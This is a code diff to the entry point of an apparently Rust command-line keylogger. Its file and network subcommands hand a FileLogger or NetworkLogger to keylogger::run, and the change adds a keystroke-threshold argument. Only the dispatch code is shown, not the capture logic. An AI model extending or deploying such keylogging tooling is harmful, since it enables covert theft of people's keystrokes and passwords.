@@ -1,5 +1,5 @@
 use clap::{Args, Parser, Subcommand};
-use keylogger::{run, FileLogger, NetworkLogger};
+use keylogger::{FileLogger, NetworkLogger};
 use std::net::IpAddr;
 
 #[derive(Parser)]
@@ -59,16 +59,13 @@ fn main() {
                     std::process::exit(1);
                 }
             };
-            if let Err(e) = run(Box::new(logger)) {
-                eprintln!("error: {}", e);
-                std::process::exit(1);
-            }
+            keylogger::run(Box::new(logger), cli.keystroke_threshold);
         }
         Commands::File(args) => {
-            if let Err(e) = run(Box::new(FileLogger::new(args.recorder_file.clone()))) {
-                eprintln!("error: {}", e);
-                std::process::exit(1);
-            }
+            keylogger::run(
+                Box::new(FileLogger::new(args.recorder_file.clone())),
+                cli.keystroke_threshold,
+            );
         }
     }
 }
